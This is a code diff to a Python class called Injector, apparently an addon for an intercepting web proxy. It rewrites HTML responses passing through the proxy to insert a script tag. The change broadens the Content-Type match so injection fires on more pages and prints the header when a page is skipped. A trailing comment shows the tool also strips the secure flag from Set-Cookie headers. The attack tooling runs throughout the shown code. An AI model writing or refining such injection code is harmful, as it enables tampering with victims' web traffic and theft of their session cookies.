@@ -42,7 +42,7 @@ class Injector:
             html = BeautifulSoup(flow.response.content, "html.parser")
             #print(self.path)
             #print(flow.response.headers)
-            if 'content-type' in flow.response.headers and flow.response.headers["content-type"] == 'text/html':
+            if 'Content-Type' in flow.response.headers and 'text/html' in flow.response.headers['Content-Type']:
                 #print(flow.response.headers["content-type"])
                 script = html.new_tag(
                     "script",
@@ -52,7 +52,8 @@ class Injector:
                 flow.response.content = str(html).encode("utf8")
                 print("\nScript injected.\n\n")
             else:
-                print("\nWrong content type. Sorry\n\n")
+                print("\nWrong content type. Sorry.")
+                print(str(flow.response.headers['Content-Type']) + "\n\n")
 
 
         # strip secure flag from 'Set-Cookie' headers
